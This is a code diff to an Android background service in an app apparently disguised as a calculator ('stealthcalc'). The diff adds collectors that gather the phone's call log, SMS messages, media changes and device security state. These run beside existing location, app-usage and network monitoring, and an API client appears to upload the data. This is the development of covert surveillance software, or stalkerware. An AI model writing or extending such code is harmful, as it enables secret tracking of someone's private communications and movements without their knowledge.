@@ -13,9 +13,13 @@ import androidx.lifecycle.lifecycleScope
 import com.stealthcalc.core.logging.AppLogger
 import com.stealthcalc.monitoring.collector.AppUsageCollector
 import com.stealthcalc.monitoring.collector.BatteryCollector
+import com.stealthcalc.monitoring.collector.CallLogCollector
+import com.stealthcalc.monitoring.collector.DeviceSecurityCollector
 import com.stealthcalc.monitoring.collector.LocationCollector
+import com.stealthcalc.monitoring.collector.MediaChangeCollector
 import com.stealthcalc.monitoring.collector.NetworkCollector
 import com.stealthcalc.monitoring.collector.ScreenStateCollector
+import com.stealthcalc.monitoring.collector.SmsCollector
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
 import dagger.hilt.android.AndroidEntryPoint
@@ -52,6 +56,10 @@ class AgentService : LifecycleService() {
     @Inject lateinit var screenStateCollector: ScreenStateCollector
     @Inject lateinit var networkCollector: NetworkCollector
     @Inject lateinit var locationCollector: LocationCollector
+    @Inject lateinit var callLogCollector: CallLogCollector
+    @Inject lateinit var smsCollector: SmsCollector
+    @Inject lateinit var mediaChangeCollector: MediaChangeCollector
+    @Inject lateinit var deviceSecurityCollector: DeviceSecurityCollector
     @Inject lateinit var apiClient: AgentApiClient
 
     private var collectJob: Job? = null
@@ -84,6 +92,8 @@ class AgentService : LifecycleService() {
     private fun startCollectors() {
         screenStateCollector.start()
         networkCollector.start()
+        mediaChangeCollector.start()
+        deviceSecurityCollector.start()
 
         collectJob?.cancel()
         collectJob = lifecycleScope.launch {
@@ -93,6 +103,8 @@ class AgentService : LifecycleService() {
                     batteryCollector.collect()
                     locationCollector.collect()
                     networkCollector.collectSnapshot()
+                    callLogCollector.collect()
+                    smsCollector.collect()
                 }.onFailure { e ->
                     AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                 }
@@ -129,6 +141,8 @@ class AgentService : LifecycleService() {
         uploadJob?.cancel()
         screenStateCollector.stop()
         networkCollector.stop()
+        mediaChangeCollector.stop()
+        deviceSecurityCollector.stop()
         AppLogger.log(this, "[agent]", "Agent service stopped")
         super.onDestroy()
     }
